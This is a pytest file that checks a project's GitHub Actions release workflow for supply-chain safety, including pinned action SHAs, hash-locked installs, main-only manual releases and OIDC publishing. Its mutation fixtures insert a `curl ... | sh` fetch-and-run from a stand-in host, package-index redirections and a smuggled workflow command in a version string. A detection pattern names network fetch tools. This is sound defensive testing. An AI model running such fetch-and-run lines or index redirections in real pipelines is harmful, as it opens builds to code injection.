"""The release workflow's security properties, checked from the repository's own files.

0.1.5, plan §44.23 (B5-R2 and the wrong-branch guard). In the required safety job,
so every CI run checks them:

- every action, in every workflow, is pinned to a full commit SHA with the release
  tag it was verified against beside it, and to the SHA recorded below;
- the build tools are installed only from `.github/release-requirements.txt`,
  every line `name==version` with SHA-256 hashes, in `--require-hashes` mode, and
  the build uses that pinned setuptools (`--no-isolation`);
- the release starts only by hand (`workflow_dispatch`), refuses any ref but main
  before checkout, and runs `scripts/release_preflight.py` (commit, version, CI)
  before any build tool is installed;
- least privilege: `contents: read` by default, `checks: read` in the build job
  for the CI query, `id-token: write` only in the publish job;
- the publish job is in the `pypi` environment, needs the build, publishes
  through Trusted Publishing (no token, no secret anywhere), and checks that it
  holds exactly the files the build job hashed;
- operator input reaches scripts only through the environment;
- CI cannot publish: no OIDC token, no environment, no publish action.

What the files cannot prove — that the `pypi` environment requires a reviewer and
only allows main, that `main` has a Ruleset — lives in GitHub's settings and is
verified there (docs/development.md, *Publishing to PyPI*).

Every check also runs against deliberately broken copies, each of which must fail it.
"""

from __future__ import annotations

import importlib.util
import io
import json
import re
from contextlib import redirect_stdout
from pathlib import Path

import pytest

from workflow_yaml import WorkflowYamlError, check_names, load

ROOT = Path(__file__).resolve().parents[1]
WORKFLOWS = ROOT / ".github" / "workflows"
RELEASE = WORKFLOWS / "release.yml"
CI = WORKFLOWS / "ci.yml"
REQUIREMENTS = ROOT / ".github" / "release-requirements.txt"
REQUIREMENTS_IN = ROOT / ".github" / "release-requirements.in"

#: Each action's pinned commit, verified on 2026-10-14 against the upstream release
#: (GitHub API: the tag's commit; annotated tags followed to their commit). A pin
#: update changes the workflow and this table together, after the same check.
VERIFIED_PINS = {
    ("actions/checkout", "v7.0.1"): "3d3c42e5aac5ba805825da76410c181273ba90b1",
    ("actions/setup-python", "v7.0.0"): "5fda3b95a4ea91299a34e894583c3862153e4b97",
    ("actions/setup-node", "v7.1.0"): "949feb2413d6458794dcd2491c4babbbce0c15c1",
    ("actions/upload-artifact", "v7.0.2"): "cf430e030ddbb5b0abf93d22962f4752f3646cd9",
    ("actions/download-artifact", "v8.0.2"): "9000827ccba6bdab643e8b6fd33ac0654aef8333",
    ("pypa/gh-action-pypi-publish", "v1.14.2"): "dc37677b2e1c63e2034f94d8a5b11f265b73ba33",
}

PIP_INSTALL = ("python -m pip install --disable-pip-version-check --require-hashes --only-binary=:all: "
               "-r .github/release-requirements.txt")
BUILD = "python -m build --no-isolation --sdist --wheel --outdir dist ."
PREFLIGHT = "python scripts/release_preflight.py"
REF_GUARD = '[ "$GITHUB_REF" = "refs/heads/main" ]'

_USES = re.compile(r"^[ ]*(?:-[ ]+)?uses:[ ]*(?P<ref>[^ #]+)(?:[ ]+#[ ]*(?P<tag>.*))?$")
_PINNED = re.compile(r"(?P<action>[A-Za-z0-9_.-]+/[A-Za-z0-9_.-]+)(?:/[A-Za-z0-9_./-]+)?@(?P<sha>[0-9a-f]{40})")
_TAG = re.compile(r"v[0-9]+[.][0-9]+[.][0-9]+")
_REQUIREMENT = re.compile(r"(?P<name>[a-z0-9][a-z0-9._-]*)==(?P<version>[0-9][A-Za-z0-9.+!]*)[ ]+[\\]")
_HASH = re.compile(r"--hash=sha256:[0-9a-f]{64}(?:[ ]+[\\])?")


def _text(path: Path) -> str:
    return "\n".join(path.read_text(encoding="utf-8").splitlines()) + "\n"


def _steps(doc: dict, job: str) -> list[dict]:
    return list(((doc.get("jobs") or {}).get(job) or {}).get("steps") or [])


def _runs(doc: dict) -> list[str]:
    return [step["run"] for job in (doc.get("jobs") or {}) for step in _steps(doc, job) if "run" in step]


# --- the checks: each returns what is wrong, empty when nothing is ---------------------


def pin_problems(texts: dict[str, str]) -> list[str]:
    """Every `uses:` in every workflow: a full SHA, the verified tag beside it, the verified SHA."""
    problems = []
    for name, text in texts.items():
        for number, line in enumerate(text.splitlines(), 1):
            if "uses:" not in line or line.lstrip().startswith("#"):
                continue
            match = _USES.match(line)
            if match is None:
                problems.append(f"{name}:{number}: a `uses:` line this check cannot read")
                continue
            ref, tag = match.group("ref"), (match.group("tag") or "").strip()
            if ref.startswith("./"):
                continue  # a local action is this repository's own code
            pinned = _PINNED.fullmatch(ref)
            if pinned is None:
                problems.append(f"{name}:{number}: {ref} is not pinned to a full commit SHA")
            elif not _TAG.fullmatch(tag):
                problems.append(f"{name}:{number}: {ref} has no `# vX.Y.Z` comment naming the release it pins")
            elif VERIFIED_PINS.get((pinned.group("action"), tag)) != pinned.group("sha"):
                problems.append(f"{name}:{number}: {pinned.group('action')}@{tag} is not the verified commit "
                                f"({VERIFIED_PINS.get((pinned.group('action'), tag), 'no verified pin for this tag')})")
    return problems


def requirement_problems(text: str, pins_in: str) -> list[str]:
    """Every requirement `name==version`, hashed; no option that changes where packages come from."""
    problems, entries, current = [], {}, None
    for number, line in enumerate(text.splitlines(), 1):
        stripped = line.strip()
        if not stripped or stripped.startswith("#"):
            continue
        if line[0] != " ":
            match = _REQUIREMENT.fullmatch(stripped)
            if match is None:
                problems.append(f"requirements:{number}: not a hashed `name==version` requirement: {stripped!r}")
                current = None
                continue
            current = match.group("name")
            if current in entries:
                problems.append(f"requirements:{number}: {current} is listed twice")
            entries[current] = [match.group("version"), 0]
        elif _HASH.fullmatch(stripped) and current is not None:
            entries[current][1] += 1
        else:
            problems.append(f"requirements:{number}: unexpected line {stripped!r}")
    problems += [f"requirements: {name}=={version} has no hash" for name, (version, hashes) in entries.items() if hashes == 0]
    for line in pins_in.splitlines():
        line = line.strip()
        if line and not line.startswith("#"):
            name, _, version = line.partition("==")
            if not version or entries.get(name, [None])[0] != version:
                problems.append(f"requirements: the input pin {line!r} is not what the hashed file pins")
    for tool in ("build", "twine", "setuptools"):
        if tool not in entries:
            problems.append(f"requirements: {tool} is not pinned")
    return problems


def build_tool_problems(doc: dict) -> list[str]:
    """The tools come only from the hashed file, and the backend is the pinned setuptools."""
    problems = []
    runs = _runs(doc)
    installs = [line.strip() for run in runs for line in run.splitlines() if "pip install" in line or "pip3 install" in line]
    if installs != [PIP_INSTALL]:
        problems.append(f"build tools: exactly one install, {PIP_INSTALL!r}; found {installs}")
    builds = [line.strip() for run in runs for line in run.splitlines() if "-m build" in line]
    if builds != [BUILD]:
        problems.append(f"build tools: exactly one build, {BUILD!r}; found {builds}")
    if any(re.search(r"(?m)(^|[ ;|&(])(uv|pipx|curl|wget|npm|npx)([ ]|$)", run) for run in runs):
        problems.append("build tools: something other than the hashed pip install fetches code")
    return problems


def trigger_problems(doc: dict) -> list[str]:
    problems = []
    on = doc.get("on")
    if not isinstance(on, dict) or list(on) != ["workflow_dispatch"]:
        problems.append(f"trigger: only workflow_dispatch may start a release; found {list(on) if isinstance(on, dict) else on!r}")
        return problems
    inputs = (on["workflow_dispatch"] or {}).get("inputs") or {}
    for name in ("version", "commit"):
        spec = inputs.get(name) or {}
        if spec.get("required") != "true" or spec.get("type") != "string":
            problems.append(f"trigger: the {name} input must be a required string")
    return problems


def permission_problems(doc: dict) -> list[str]:
    problems = []
    if doc.get("permissions") != {"contents": "read"}:
        problems.append(f"permissions: the default must be contents: read; found {doc.get('permissions')}")
    expected = {"build": {"contents": "read", "checks": "read", "actions": "read"}, "publish": {"id-token": "write"}}
    jobs = doc.get("jobs") or {}
    if set(jobs) != set(expected):
        problems.append(f"jobs: exactly build and publish; found {sorted(jobs)}")
    for job, permissions in expected.items():
        if (jobs.get(job) or {}).get("permissions") != permissions:
            problems.append(f"permissions: the {job} job must have exactly {permissions}; found {(jobs.get(job) or {}).get('permissions')}")
    return problems


def guard_problems(doc: dict) -> list[str]:
    """Main only, before checkout; the preflight before any build tool; publish kept off other refs."""
    problems = []
    steps = _steps(doc, "build")
    if not steps or REF_GUARD not in (steps[0].get("run") or "") or "exit 1" not in (steps[0].get("run") or ""):
        problems.append("guard: the build job's first step must refuse any ref but refs/heads/main")
    order = {"checkout": None, "preflight": None, "install": None, "build": None}
    for index, step in enumerate(steps):
        uses, run = step.get("uses") or "", step.get("run") or ""
        if uses.startswith("actions/checkout@") and order["checkout"] is None:
            order["checkout"] = index
        if run.strip() == PREFLIGHT:
            order["preflight"] = index
            env = step.get("env") or {}
            if env != {"RELEASE_VERSION": "${{ inputs.version }}", "RELEASE_COMMIT": "${{ inputs.commit }}", "GH_TOKEN": "${{ github.token }}"}:
                problems.append(f"guard: the preflight must get the version, the commit and the token through env; found {env}")
        if "pip install" in run and order["install"] is None:
            order["install"] = index
        if "-m build" in run and order["build"] is None:
            order["build"] = index
    if None in order.values() or not (order["checkout"] < order["preflight"] < order["install"] < order["build"]):
        problems.append(f"guard: checkout, then {PREFLIGHT}, then the install, then the build; found steps {order}")
    publish = (doc.get("jobs") or {}).get("publish") or {}
    if publish.get("if") != "github.ref == 'refs/heads/main'":
        problems.append("guard: the publish job must run only on refs/heads/main")
    return problems


def publish_problems(doc: dict, text: str) -> list[str]:
    """The pypi environment, after the build, Trusted Publishing, exactly the hashed files."""
    problems = []
    jobs = doc.get("jobs") or {}
    build, publish = jobs.get("build") or {}, jobs.get("publish") or {}
    if publish.get("needs") != "build":
        problems.append("publish: must need the build job")
    if (publish.get("environment") or {}).get("name") != "pypi":
        problems.append("publish: must run in the `pypi` environment (the Trusted Publisher's)")
    if "environment" in build:
        problems.append("build: must not run in an environment")
    if build.get("outputs") != {"sha256": "${{ steps.record.outputs.sha256 }}"}:
        problems.append("build: must output the SHA-256 of what it built")
    record = [step for step in _steps(doc, "build") if step.get("id") == "record"]
    if not record or "GITHUB_OUTPUT" not in (record[0].get("run") or "") or "sha256sum" not in (record[0].get("run") or ""):
        problems.append("build: the record step must hash dist/ into the job's output")
    version_checks = [step for step in _steps(doc, "build") if (step.get("env") or {}).get("VERSION") == "${{ inputs.version }}"]
    if not version_checks or 'bugpilot-${VERSION}-py3-none-any.whl' not in (version_checks[0].get("run") or ""):
        problems.append("build: must check that exactly the requested version was built")
    if not any("twine check --strict dist/*" in run for run in _runs(doc)):
        problems.append("build: must run twine check --strict")
    uploads = [step for step in _steps(doc, "build") if (step.get("uses") or "").startswith("actions/upload-artifact@")]
    steps = _steps(doc, "publish")
    uses = [(step.get("uses") or "").split("@")[0] for step in steps]
    if uses != ["actions/download-artifact", "", "pypa/gh-action-pypi-publish"]:
        problems.append(f"publish: download, check, publish — and nothing else; found {uses}")
    else:
        download, check, action = steps
        artifact = {"name": "python-distributions", "path": "dist/"}
        if not uploads or {k: (uploads[0].get("with") or {}).get(k) for k in artifact} != artifact or (download.get("with") or {}) != artifact:
            problems.append("publish: must download exactly the artifact the build job uploaded")
        if (check.get("env") or {}) != {"EXPECTED": "${{ needs.build.outputs.sha256 }}"} or "sha256sum --check --strict" not in (check.get("run") or ""):
            problems.append("publish: must check the files against the build job's hashes")
        if action.get("with"):
            problems.append(f"publish: the publish action takes no inputs (OIDC, the default index); found {action.get('with')}")
    if "secrets." in text:
        problems.append("publish: no secret may be used (Trusted Publishing needs none)")
    return problems


def bypass_problems(doc: dict, requirements_text: str) -> list[str]:
    """Nothing that would let a failing guard pass quietly, or change what the steps run."""
    problems = []
    if "defaults" in doc or "env" in doc:
        problems.append("bypass: no workflow-level defaults or env (a default shell or a PIP_* variable would change every step)")
    for job_id, job in (doc.get("jobs") or {}).items():
        for key in ("defaults", "env", "continue-on-error"):
            if key in job:
                problems.append(f"bypass: the {job_id} job must not set {key}")
        for step in job.get("steps") or []:
            label = step.get("name") or step.get("uses")
            if "continue-on-error" in step or "if" in step:
                problems.append(f"bypass: {label!r} must run unconditionally and fail the job (no if, no continue-on-error)")
            if "run" in step and step.get("shell") != "bash":
                problems.append(f"bypass: {label!r} must say `shell: bash` (-e and pipefail, whatever a default says)")
            if (step.get("uses") or "").startswith("actions/checkout@") and step.get("with") != {"persist-credentials": "false"}:
                problems.append(f"bypass: checkout must take only persist-credentials: false (no ref, repository or token); found {step.get('with')}")
            if (step.get("uses") or "").startswith("actions/setup-python@"):
                python = (step.get("with") or {}).get("python-version")
                if f"--python-version {python} " not in requirements_text:
                    problems.append(f"bypass: setup-python's {python!r} is not the Python the hashed requirements were resolved for")
    return problems


def injection_problems(doc: dict) -> list[str]:
    """`${{ }}` never inside a script: operator input and context reach `run` only through env."""
    return [f"injection: a run script holds an expression: {run.strip()[:80]!r}" for run in _runs(doc) if "${{" in run]


def ci_publish_problems(ci: dict, ci_text: str) -> list[str]:
    problems = []
    if ci.get("permissions") != {"contents": "read"}:
        problems.append("ci: the default permissions must be contents: read")
    for job_id, job in (ci.get("jobs") or {}).items():
        if "environment" in job or "write" in str(job.get("permissions") or {}):
            problems.append(f"ci: the {job_id} job must have no environment and no write permission")
    code = "\n".join(line for line in ci_text.splitlines() if not line.lstrip().startswith("#")).lower()
    for marker in ("id-token", "gh-action-pypi-publish", "pypa/", "twine upload"):
        if marker in code:
            problems.append(f"ci: {marker!r} has no place in CI")
    return problems


def release_problems(release_text: str, requirements_text: str, requirements_in: str, ci_text: str) -> list[str]:
    release, ci = load(release_text), load(ci_text)
    return (pin_problems({"release.yml": release_text, "ci.yml": ci_text})
            + requirement_problems(requirements_text, requirements_in)
            + build_tool_problems(release) + trigger_problems(release) + permission_problems(release)
            + guard_problems(release) + publish_problems(release, release_text) + injection_problems(release)
            + bypass_problems(release, requirements_text)
            + ci_publish_problems(ci, ci_text))


def _files() -> dict[str, str]:
    return {"release": _text(RELEASE), "requirements": _text(REQUIREMENTS), "requirements_in": _text(REQUIREMENTS_IN), "ci": _text(CI)}


def _problems(files: dict[str, str]) -> list[str]:
    return release_problems(files["release"], files["requirements"], files["requirements_in"], files["ci"])


# --- the repository as it stands --------------------------------------------------------


def test_the_release_workflow_and_ci_have_no_problem():
    assert _problems(_files()) == []


def test_every_workflow_file_is_checked_for_pins():
    # A new workflow file must be added to the pin check, not slip past it.
    assert sorted(path.name for path in WORKFLOWS.iterdir()) == ["ci.yml", "release.yml"]
    assert pin_problems({path.name: _text(path) for path in WORKFLOWS.iterdir()}) == []


def test_only_the_release_workflow_holds_the_publish_action():
    holders = sorted(path.name for path in WORKFLOWS.iterdir() if "gh-action-pypi-publish" in _text(path))
    assert holders == ["release.yml"]


def test_the_preflight_requires_exactly_the_nine_ci_checks():
    preflight = _preflight()
    names = check_names(load(_text(CI)))
    assert len(names) == 9 and len(set(names)) == 9
    assert sorted(preflight.REQUIRED_CHECKS) == sorted(names)
    # The release workflow's own jobs cannot stand in for a CI check.
    assert not set(check_names(load(_text(RELEASE)))) & set(names)


def test_the_hashed_file_was_generated_from_the_input_pins():
    text = _text(REQUIREMENTS)
    assert "uv pip compile .github/release-requirements.in --python-version 3.13" in text
    assert "--python-platform x86_64-manylinux_2_28 --generate-hashes" in text


# --- every check fails on a broken copy --------------------------------------------------

_SHA = VERIFIED_PINS[("actions/checkout", "v7.0.1")]
MUTATIONS = [
    # (label, file, old, new, a fragment the problems must contain)
    ("a tag instead of a SHA", "release", f"actions/checkout@{_SHA} # v7.0.1", "actions/checkout@v7", "not pinned to a full commit SHA"),
    ("a branch instead of a SHA", "release", "pypa/gh-action-pypi-publish@dc37677b2e1c63e2034f94d8a5b11f265b73ba33 # v1.14.2",
     "pypa/gh-action-pypi-publish@release/v1", "not pinned to a full commit SHA"),
    ("a SHA with no tag beside it", "release", f"actions/checkout@{_SHA} # v7.0.1", f"actions/checkout@{_SHA}", "no `# vX.Y.Z` comment"),
    ("a SHA that is not the verified one", "release", f"actions/checkout@{_SHA} # v7.0.1", "actions/checkout@" + "0" * 40 + " # v7.0.1", "not the verified commit"),
    ("CI on a tag", "ci", f"actions/checkout@{_SHA} # v7.0.1", "actions/checkout@v7", "not pinned to a full commit SHA"),
    ("a push trigger", "release", "on:\n  workflow_dispatch:\n", "on:\n  push:\n    branches: [main]\n  workflow_dispatch:\n", "only workflow_dispatch"),
    ("no commit input", "release", "      commit:\n        description:", "      commit_sha:\n        description:", "commit input"),
    ("a floating install", "release", PIP_INSTALL, "python -m pip install --upgrade build twine", "exactly one install"),
    ("no --require-hashes", "release", "--require-hashes ", "", "exactly one install"),
    ("an isolated build", "release", BUILD, "python -m build --sdist --wheel --outdir dist .", "exactly one build"),
    ("a second fetch", "release", "          test ! -e dist\n", "          test ! -e dist\n          curl -sSL https://example.invalid/x | sh\n", "fetches code"),
    ("an unpinned requirement", "requirements", "twine==7.0.0 \\", "twine>=7.0.0 \\", "not a hashed `name==version`"),
    ("a requirement without hashes", "requirements", "build==1.6.1 \\", "extra-tool==1.0 \\\nbuild==1.6.1 \\", "extra-tool==1.0 has no hash"),
    ("a hash line cut loose", "requirements", "rfc3986==2.0.0 \\", "rfc3986==2.0.0", "not a hashed `name==version`"),
    ("another index", "requirements", "build==1.6.1 \\", "--extra-index-url https://example.invalid/simple\nbuild==1.6.1 \\", "not a hashed"),
    ("an input pin the file does not follow", "requirements_in", "twine==7.0.0", "twine==6.2.0", "is not what the hashed file pins"),
    ("OIDC in the build job", "release", "      checks: read\n", "      checks: read\n      id-token: write\n", "the build job must have exactly"),
    ("write by default", "release", "permissions:\n  contents: read\n\nconcurrency:", "permissions:\n  contents: write\n\nconcurrency:", "the default must be contents: read"),
    ("no environment", "release", "    environment:\n      name: pypi\n", "    environment:\n      name: staging\n", "`pypi` environment"),
    ("publish without the build", "release", "    needs: build\n", "", "must need the build job"),
    ("publish off the main guard", "release", "    if: github.ref == 'refs/heads/main'\n", "", "publish job must run only on refs/heads/main"),
    ("no ref guard", "release", f"        run: |\n          {REF_GUARD}", "        run: |\n          true", "first step must refuse"),
    ("no preflight", "release", f"        run: {PREFLIGHT}\n", "        run: echo skipped\n", "checkout, then"),
    ("an expression in a script", "release", f"        run: {PREFLIGHT}\n", f"        run: RELEASE_VERSION=${{{{ inputs.version }}}} {PREFLIGHT}\n", "holds an expression"),
    ("a token instead of OIDC", "release", "# v1.14.2\n", "# v1.14.2\n        with:\n          password: ${{ secrets.PYPI_API_TOKEN }}\n", "no secret"),
    ("no hash check before publishing", "release", "sha256sum --check --strict", "sha256sum", "check the files against"),
    ("a checkout in the publish job", "release", "    steps:\n      - uses: actions/download-artifact",
     f"    steps:\n      - uses: actions/checkout@{_SHA} # v7.0.1\n      - uses: actions/download-artifact", "download, check, publish"),
    ("OIDC in CI", "ci", "permissions:\n  contents: read\n", "permissions:\n  contents: read\n  id-token: write\n", "contents: read"),
    # Ways to keep every line above and still let a failing guard pass, or change what the steps run.
    ("a preflight allowed to fail", "release", "      - name: Check the release source\n",
     "      - name: Check the release source\n        continue-on-error: true\n", "must run unconditionally"),
    ("a skippable ref guard", "release", "      - name: Refuse any ref but main\n", "      - name: Refuse any ref but main\n        if: false\n", "must run unconditionally"),
    ("a job allowed to fail", "release", "    name: Build and check\n", "    name: Build and check\n    continue-on-error: true\n", "must not set continue-on-error"),
    ("a script without bash -e", "release", "        shell: bash\n        run: |\n          printf", "        run: |\n          printf", "must say `shell: bash`"),
    ("a default shell", "release", "permissions:\n  contents: read\n\nconcurrency:",
     "permissions:\n  contents: read\n\ndefaults:\n  run:\n    shell: sh\n\nconcurrency:", "no workflow-level defaults"),
    ("a package index from the environment", "release", "\njobs:\n", "\nenv:\n  PIP_INDEX_URL: https://example.invalid/simple\n\njobs:\n", "no workflow-level defaults or env"),
    ("a checkout of another ref", "release", "          persist-credentials: false\n", "          persist-credentials: false\n          ref: refs/heads/other\n", "checkout must take only"),
    ("a checkout that keeps credentials", "release", "          persist-credentials: false\n", "          persist-credentials: true\n", "checkout must take only"),
    ("another Python than the lock's", "release", 'python-version: "3.13"', 'python-version: "3.14"', "not the Python the hashed requirements"),
]


@pytest.mark.parametrize("label, which, old, new, fragment", MUTATIONS, ids=[m[0] for m in MUTATIONS])
def test_a_broken_copy_fails(label, which, old, new, fragment):
    files = _files()
    assert old in files[which], f"the mutation's anchor is gone from {which}: {old!r}"
    files[which] = files[which].replace(old, new, 1)
    problems = _problems(files)
    assert any(fragment in problem for problem in problems), problems


def test_a_colon_space_in_a_plain_script_line_is_refused():
    # GitHub rejects the workflow; so must this reader (the first draft of the pinned install did this).
    broken = _text(RELEASE).replace("        run: |\n          " + PIP_INSTALL, "        run: " + PIP_INSTALL, 1)
    assert broken != _text(RELEASE)
    with pytest.raises(WorkflowYamlError, match="read as a mapping"):
        load(broken)


@pytest.mark.parametrize("text", ["a: &x 1\n", "a: *x\n", "a: {b: {c: 1}}\n", "a: {b: 1, b: 2}\n", "a: 1\na: 2\n",
                                  "a:\n\tb: 1\n", "---\na: 1\n", "a: one\n  two\n", "a: !tag x\n"])
def test_the_reader_refuses_what_it_does_not_understand(text):
    with pytest.raises(WorkflowYamlError):
        load(text)


def test_the_reader_reads_the_subset():
    doc = load("on:\n  push:\n    branches: [main, 'x']\njobs:\n  a:\n    steps:\n      - uses: x/y@1 # c\n"
               "        with:\n          k: \"v: w\"\n      - run: |\n          one\n\n          two\n      - run: >-\n          a\n          b\n"
               "list:\n- p\n- { os: ubuntu-latest, python: \"3.13\" }\n")
    assert doc == {"on": {"push": {"branches": ["main", "x"]}},
                   "jobs": {"a": {"steps": [{"uses": "x/y@1", "with": {"k": "v: w"}}, {"run": "one\n\ntwo"}, {"run": "a b"}]}},
                   "list": ["p", {"os": "ubuntu-latest", "python": "3.13"}]}


# --- the preflight script -----------------------------------------------------------------


def _preflight():
    spec = importlib.util.spec_from_file_location("release_preflight", ROOT / "scripts" / "release_preflight.py")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


COMMIT = "1b602324550a67fd985f1a314d2aba6967779c8a"
GOOD = dict(ref="refs/heads/main", github_sha=COMMIT, head=COMMIT, commit=COMMIT, version="0.1.5",
            package_version="0.1.5", extension_version="0.1.5")


SUITE, OTHER_SUITE = 104713764111, 555


def _check(name, conclusion="success", status="completed", run_id=1, app="github-actions", suite=SUITE, sha=COMMIT):
    """A check run as GitHub's API returns it (the fields the preflight reads)."""
    return {"name": name, "status": status, "conclusion": conclusion, "id": run_id, "app": {"slug": app},
            "check_suite": {"id": suite}, "head_sha": sha}


def _workflow(run_id=38641590465, path=".github/workflows/ci.yml", status="completed", conclusion="success", suite=SUITE, sha=COMMIT):
    """A workflow run as GitHub's Actions API returns it."""
    return {"id": run_id, "path": path, "status": status, "conclusion": conclusion, "check_suite_id": suite, "head_sha": sha}


def _green(preflight, suite=SUITE, first_id=10):
    return [_check(name, run_id=first_id + i, suite=suite) for i, name in enumerate(preflight.REQUIRED_CHECKS)]


def test_preflight_accepts_main_at_the_reviewed_commit_and_version():
    assert _preflight().source_problems(**GOOD) == []


@pytest.mark.parametrize("change, fragment", [
    ({"ref": "refs/heads/feature"}, "only from refs/heads/main"),
    ({"ref": "refs/tags/v0.1.5"}, "only from refs/heads/main"),
    ({"ref": "refs/pull/1/merge"}, "only from refs/heads/main"),
    ({"commit": COMMIT[:7]}, "full 40-character"),
    ({"commit": COMMIT.upper()}, "full 40-character"),
    ({"github_sha": "a" * 40}, "not the commit this run checked out"),
    ({"head": "b" * 40}, "not the commit this run checked out"),
    ({"head": ""}, "not the commit this run checked out"),
    ({"version": "0.1.5\n::add-mask::x"}, "must look like 1.2.3"),
    ({"version": "0.1.\u0665"}, "must look like 1.2.3"),
    ({"package_version": "0.1.4"}, "bugpilot/__init__.py"),
    ({"extension_version": "0.1.4"}, "extension/package.json"),
])
def test_preflight_refuses(change, fragment):
    problems = _preflight().source_problems(**{**GOOD, **change})
    assert any(fragment in problem for problem in problems), problems


def test_preflight_accepts_ci_green_on_the_commit():
    preflight = _preflight()
    assert preflight.ci_problems(_green(preflight), [_workflow()], COMMIT) == []
    # Two CI runs on the commit (a push and a dispatch, as for 1b60232), both green.
    both = _green(preflight) + _green(preflight, suite=OTHER_SUITE, first_id=100)
    assert preflight.ci_problems(both, [_workflow(), _workflow(run_id=38641590466, suite=OTHER_SUITE)], COMMIT) == []


def test_preflight_judges_the_newest_check_run_of_each_job():
    preflight = _preflight()
    names, ci, green = preflight.REQUIRED_CHECKS, [_workflow()], _green(preflight)
    # A later failure (a re-run) overrides an earlier success; a later success after a failure counts.
    assert any("failure" in p for p in preflight.ci_problems(green + [_check(names[0], "failure", run_id=99)], ci, COMMIT))
    assert preflight.ci_problems([_check(names[0], "failure", run_id=1)] + green, ci, COMMIT) == []
    # Missing, re-running, cancelled, skipped or neutral: refused.
    assert any("has not run" in p for p in preflight.ci_problems(green[1:], ci, COMMIT))
    for status, conclusion in (("in_progress", None), ("queued", None), ("completed", "cancelled"),
                               ("completed", "skipped"), ("completed", "neutral")):
        problems = preflight.ci_problems(green + [_check(names[0], conclusion, status, 99)], ci, COMMIT)
        assert any(f"{status}/{conclusion}" in p for p in problems), (status, conclusion, problems)


def test_preflight_counts_only_ci_s_own_results():
    preflight = _preflight()
    names, ci, green = preflight.REQUIRED_CHECKS, [_workflow()], _green(preflight)
    # The same name from another app, from another workflow's check suite, or for another commit: not CI's.
    for impostor in (_check(names[0], app="someone-else", run_id=99), _check(names[0], suite=OTHER_SUITE, run_id=99),
                     _check(names[0], sha="c" * 40, run_id=99)):
        assert any("has not run" in p for p in preflight.ci_problems(green[1:] + [impostor], ci, COMMIT)), impostor
    # A failing check of another workflow cannot spoil CI's own green result either.
    assert preflight.ci_problems(green + [_check(names[0], "failure", suite=OTHER_SUITE, run_id=99)], ci, COMMIT) == []
    # Green checks with no CI workflow run behind them (the release workflow's own runs, another commit's CI): refused.
    for runs in ([_workflow(path=".github/workflows/release.yml")], [_workflow(sha="d" * 40)], []):
        assert any("no run of .github/workflows/ci.yml" in p for p in preflight.ci_problems(green, runs, COMMIT)), runs


def test_preflight_refuses_while_ci_runs_or_after_its_newest_run_failed():
    preflight = _preflight()
    green = _green(preflight)
    # A CI run queued or running on the commit — even one whose jobs have no check run yet.
    for status in ("queued", "in_progress", "waiting"):
        newer = _workflow(run_id=38641590499, status=status, conclusion=None, suite=OTHER_SUITE)
        problems = preflight.ci_problems(green, [_workflow(), newer], COMMIT)
        assert any("still running" in p for p in problems), problems
    # The newest CI run failed or was cancelled, even though an older one passed.
    for conclusion in ("failure", "cancelled"):
        newer = _workflow(run_id=38641590499, conclusion=conclusion, suite=OTHER_SUITE)
        problems = preflight.ci_problems(green, [_workflow(), newer], COMMIT)
        assert any("newest CI run" in p for p in problems), problems


def test_preflight_fails_closed_on_any_api_trouble(monkeypatch):
    preflight = _preflight()
    monkeypatch.setattr(preflight, "source_versions", lambda root=None: ("0.1.5", "0.1.5"))
    monkeypatch.setattr(preflight.subprocess, "run", lambda *a, **k: type("R", (), {"stdout": COMMIT})())
    for key, value in {"GITHUB_REF": "refs/heads/main", "GITHUB_SHA": COMMIT, "RELEASE_COMMIT": COMMIT,
                       "RELEASE_VERSION": "0.1.5", "GITHUB_REPOSITORY": "owner/repo"}.items():
        monkeypatch.setenv(key, value)

    def answers(check_runs, workflow_runs):
        return lambda api, path, key, token: {"check_runs": check_runs, "workflow_runs": workflow_runs}[key]

    def run_main():
        out = io.StringIO()
        with redirect_stdout(out):
            code = preflight.main()
        return code, out.getvalue()

    monkeypatch.setattr(preflight, "fetch_all", answers(_green(preflight), [_workflow()]))
    code, out = run_main()
    assert code == 0 and "all 9 CI checks green" in out, out

    def offline(*args):
        raise OSError("network unreachable")

    monkeypatch.setattr(preflight, "fetch_all", offline)
    code, out = run_main()
    assert code == 1 and "::error::could not read or judge CI's results" in out, out
    # An answer that does not add up — a workflow run without an id — refuses too.
    monkeypatch.setattr(preflight, "fetch_all", answers(_green(preflight), [{"path": ".github/workflows/ci.yml", "head_sha": COMMIT}]))
    code, out = run_main()
    assert code == 1 and "could not read or judge" in out, out
    # Once the source is refused, CI is not read at all.
    monkeypatch.setenv("GITHUB_REF", "refs/heads/other")
    monkeypatch.setattr(preflight, "fetch_all", lambda *a: pytest.fail("CI is not read once the source is refused"))
    assert run_main()[0] == 1


class _Response(io.BytesIO):
    def __enter__(self):
        return self

    def __exit__(self, *exc):
        return False


def test_fetch_all_reads_every_page_and_refuses_an_answer_that_does_not_add_up(monkeypatch):
    preflight = _preflight()
    asked = []

    def serve(bodies):
        def urlopen(request, timeout):
            asked.append(request.full_url)
            return _Response(json.dumps(bodies[len(asked) - 1]).encode())
        monkeypatch.setattr(preflight.urllib.request, "urlopen", urlopen)

    serve([{"total_count": 3, "check_runs": [{"id": 1}, {"id": 2}]}, {"total_count": 3, "check_runs": [{"id": 3}]}])
    assert [run["id"] for run in preflight.fetch_all("https://api", "/x?filter=all", "check_runs", "token")] == [1, 2, 3]
    assert asked == ["https://api/x?filter=all&per_page=100&page=1", "https://api/x?filter=all&per_page=100&page=2"]
    for bodies in ([{"total_count": 3, "check_runs": [{"id": 1}]}, {"total_count": 3, "check_runs": []}],  # fewer than it counted
                   [{"check_runs": []}],  # no total_count
                   [{"total_count": 0, "message": "Not Found"}]):  # no list
        asked.clear()
        serve(bodies)
        with pytest.raises(ValueError):
            preflight.fetch_all("https://api", "/x", "check_runs", None)
    asked.clear()
    serve([{"total_count": 10_000, "check_runs": [{"id": page}]} for page in range(preflight.MAX_PAGES)])
    with pytest.raises(ValueError, match="pages"):
        preflight.fetch_all("https://api", "/x", "check_runs", None)


def test_the_source_versions_move_together():
    package_version, extension_version = _preflight().source_versions()
    assert package_version and package_version == extension_version
